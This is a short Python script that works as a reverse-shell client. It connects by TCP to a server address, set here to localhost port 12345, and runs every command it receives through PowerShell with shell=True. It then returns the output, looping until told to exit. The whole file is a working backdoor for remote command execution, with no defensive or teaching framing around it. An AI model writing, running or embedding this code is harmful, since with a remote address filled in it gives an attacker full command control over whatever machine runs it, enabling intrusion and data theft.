import socket
import subprocess

# Server details
server_ip = '127.0.0.1'
server_port = 12345

# Create a socket for communication
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
client_socket.connect((server_ip, server_port))

while True:
    # Receive the command from the server
    command = client_socket.recv(4096).decode()

    if command.lower() == 'exit':
        break

    try:
        # Execute the command in PowerShell and get the output
        powershell_command = f'powershell.exe -Command "{command}"'
        output = subprocess.check_output(powershell_command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except subprocess.CalledProcessError as e:
        # If the command execution fails, capture the error message
        output = e.output

    # Send the output back to the server
    client_socket.send(output.encode())

# Close the connection
client_socket.close()
